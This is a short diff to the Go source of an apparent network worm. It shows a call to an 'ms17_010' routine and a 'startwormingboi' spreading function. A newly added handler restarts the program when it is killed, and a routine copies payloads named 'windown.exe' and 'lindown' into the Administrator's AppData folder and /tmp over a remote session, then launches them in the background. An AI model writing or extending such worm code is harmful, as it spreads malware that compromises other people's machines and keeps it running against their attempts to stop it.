@@ -2,7 +2,6 @@ package main
 
 import
 (
-	"regexp"
 	"github.com/syossan27/tebata"
 	"syscall"
 	"runtime"
@@ -24,6 +23,12 @@ func main() {
 		ms17_010()
 		startwormingboi(myos)
 	}
+}
+
+func handler1() {
+	cmd := exec.Command(os.Args[0])
+	cmd.Start()
+	os.Exit(13)
 }
 
 func startwormingboi(myos string) {
@@ -51,7 +56,7 @@ func startwormingboi(myos string) {
 
 func getinlin(){
 
-	session := newsession(connection)
+	session, err := newsession()
 	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
 	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
 	scpexec(session, "lindown", "/tmp/lindown")
